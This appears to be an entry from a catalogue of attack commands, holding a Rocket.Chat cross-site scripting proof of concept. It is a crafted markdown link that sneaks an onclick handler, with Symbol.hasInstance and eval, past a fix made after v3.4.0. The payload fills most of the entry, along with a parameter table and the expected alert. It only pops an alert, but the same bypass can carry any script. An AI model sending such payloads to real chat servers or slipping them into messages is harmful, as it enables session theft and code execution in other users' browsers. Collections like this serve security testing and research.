---
data: >-
  https://a?p=[
  ](https://a.de?/onclick='alert\x28\x27XSS\x27\x29'instanceof{[Symbol.hasInstance]:eval}`.")
tags:
  - xss
  - clickjack
type: command
output: null
executor: javascript
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:33:24.229Z'
id: 194ea4a9-f98c-4263-8820-fa663e5ccd36
verified: false
validated: true
submitted: true
---
# rocket-chat-click-bypass-poc

## Command

```javascript
https://a?p=[ ](https://a.de?/onclick='alert\x28\x27XSS\x27\x29'instanceof{[Symbol.hasInstance]:eval}`.")
```

## Description

Post-v3.4.0 bypass requiring click for onclick alert.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| onclick=... | Click handler | Yes |

## Examples

Send and click link.

## Expected Output

Alert on click.

## Related

- [[commands/rocket-chat-postfix-bypass-alert1]]
